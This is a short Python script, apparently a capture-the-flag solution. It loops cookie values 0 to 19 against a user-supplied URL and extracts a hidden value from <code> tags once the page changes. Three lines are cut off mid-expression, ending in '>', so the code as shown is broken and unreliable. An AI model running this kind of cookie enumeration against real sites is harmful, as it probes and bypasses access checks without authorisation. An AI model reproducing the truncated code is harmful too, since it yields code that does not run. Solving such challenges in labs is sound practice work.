#!/usr/bin/python

import requests

url = input('URL:')

for i in range(0, 20):
    text = str(i)
    cookies = {
        'name': text
    }

    r = requests.get(url, cookies=cookies)
    result = r.text.split(
        "<p style=\"text-align:center; font-size:30px;\"><>
    print("[+] Testing Cookie:{} | Result: {}".format(i, r>
    if 'I love' not in result:
        print(r.text.split("<code>")[1].split("</code>")[0>
        break
